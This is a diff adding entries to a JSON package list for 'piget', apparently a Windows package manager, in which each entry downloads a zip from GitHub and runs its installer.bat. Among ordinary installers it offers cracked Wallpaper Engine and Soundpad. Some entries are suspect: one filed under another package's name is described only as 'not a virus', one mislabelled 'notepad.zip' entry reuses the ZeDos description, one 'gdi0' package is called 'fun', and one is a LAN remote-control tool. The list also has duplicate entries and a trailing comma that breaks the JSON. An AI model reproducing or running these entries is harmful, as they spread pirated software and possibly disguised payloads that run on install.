@@ -18,13 +18,298 @@
       "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/timinganlyz.zip",
       "InitialScript": "@echo off && start timinganlyz.exe"
     },
-
-
-    
     {
       "Name": "zedos",
       "Description": "Скачивание, распаковка и запуск установщика ZeDos 6.1.0",
       "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/zedos.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "winupd",
+      "Description": "Автоматический апгрейд / даунгрейд windows",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/winupd.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "winrar",
+      "Description": "Скачивание и запуск установщика winrar",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/winrar.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "winget",
+      "Description": "Установка winget",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/winget.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "wallpaper-engine",
+      "Description": "Скачивание и установка Wallpaper Engine (Проверенный кряк)",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/WallpaperEngine.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "vscode",
+      "Description": "Скачивание и запуск установщика Visual Studio Code",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/vscode.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "vmware",
+      "Description": "Скачивание и запуск установщика VmWare",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/vmware.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "vmbox",
+      "Description": "Скачивание и запуск установщика VmBox",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/vmbox.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "victoria",
+      "Description": "Скачивание и запуск Victoria",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/Victoria537.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "viber",
+      "Description": "Скачивание и запуск установщика viber",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/Viber.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "utorrent",
+      "Description": "Скачивание и запуск установщика Utorrent",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/utorrent.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "toRecovery",
+      "Description": "Перезагрузка в режим восстановления windows",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/toRecovery.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "toBios",
+      "Description": "Перезагрузка в Bios",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/toBios.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "tllegacy",
+      "Description": "Скачивание и запуск установщика tllegacy",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/tllegacy.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "tlauncher",
+      "Description": "Скачивание и запуск установщика tlauncher",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/tlauncher.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "zedos",
+      "Description": "Не вирус",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/tin.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "telegram",
+      "Description": "Скачивание и запуск установщика telegram",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/telegram.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "steam",
+      "Description": "Скачивание и запуск установщика steam",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/steam.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "spotify",
+      "Description": "Скачивание и запуск установщика Spotify",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/Spotify.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "soundpad",
+      "Description": "Установка Soundpad (Проверенный кряк)",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/Soundpad.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "rulauncher",
+      "Description": "Скачивание и запуск установщика rulauncher",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/rulauncher.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "qbittorrent",
+      "Description": "Скачивание и запуск установщика qbittorrent",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/qbittorrent.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "pinwin",
+      "Description": "Скачивание и запуск установщика PinWin",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/PinWin.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "pigetlist",
+      "Description": "Просмотр пакетов старого PIGET",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/pigetlist.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "operagx",
+      "Description": "Скачивание и запуск установщика OperaGX",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/OperaGX.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "opera",
+      "Description": "Скачивание и запуск установщика Opera",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/Opera.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "obs",
+      "Description": "Скачивание и запуск установщика OBS",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/obs.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "notepad.zip",
+      "Description": "Скачивание и запуск установщика ZeDos 6.1.0",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/notepad.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "neurosama",
+      "Description": "а неет нейросама",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/neurosama.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "zedos",
+      "Description": "Скачивание и запуск установщика ZeDos 6.1.0",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/zedos.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "localdrop",
+      "Description": "Передача файлов по локальной сети",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/net.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "lmc",
+      "Description": "Удаленное управление компьютерами в локальной сети",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/lmc.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "ldplayer",
+      "Description": "Скачивание и запуск установщика ldplayer",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/ldplayer.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "klauncher",
+      "Description": "Скачивание и запуск установщика klauncher",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/klauncher.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "jetbrains-rider",
+      "Description": "Скачивание и запуск установщика jetbrains-rider",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/jetbrains-rider.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "jetbrains-dotpeek",
+      "Description": "Скачивание и запуск установщика jetbrains-dotpeek",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/jetbrains-dotpeek.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "jetbrains-clion",
+      "Description": "Скачивание и запуск установщика jetbrains-clion",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/jetbrains-clion.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "hwm",
+      "Description": "Скачивание и запуск установщика HWM",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/HWMSetup.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "gitstart",
+      "Description": "Автоматическое клонирование репозитория и запуск файла проекта. piget gitstart {replink}",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/gitst.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "git",
+      "Description": "Скачивание и запуск установщика git",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/git.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "gdi0",
+      "Description": "весело",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/gdi0.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "firefox",
+      "Description": "Скачивание и запуск установщика firefox",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/firefox.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "epic-games-launcher",
+      "Description": "Скачивание и запуск установщика EpicGamesLauncher",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/EpicGamesLauncher.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "discord",
+      "Description": "Скачивание и запуск установщика discord",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/discord.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "chrome",
+      "Description": "Скачивание и запуск установщика chrome",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/chrome.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "cdm",
+      "Description": "Скачивание и установка osu карты с зеркала chimu.moe | Синтаксис: api cdm [mapID]",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/cdm.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "benchmark",
+      "Description": "Запуск бенчмарка",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/benchmark.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "arduinoide",
+      "Description": "Скачивание, распаковка и запуск установщика arduinoide",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/arduinoide.zip",
+      "InitialScript": "@echo off && call installer.bat"
+    },
+    {
+      "Name": "7z",
+      "Description": "Скачивание, распаковка и запуск установщика 7zip",
+      "Resources": "https://github.com/mnd0929/piget-library/raw/main/resources/7z.zip",
       "InitialScript": "@echo off && call installer.bat"
     },
   ]
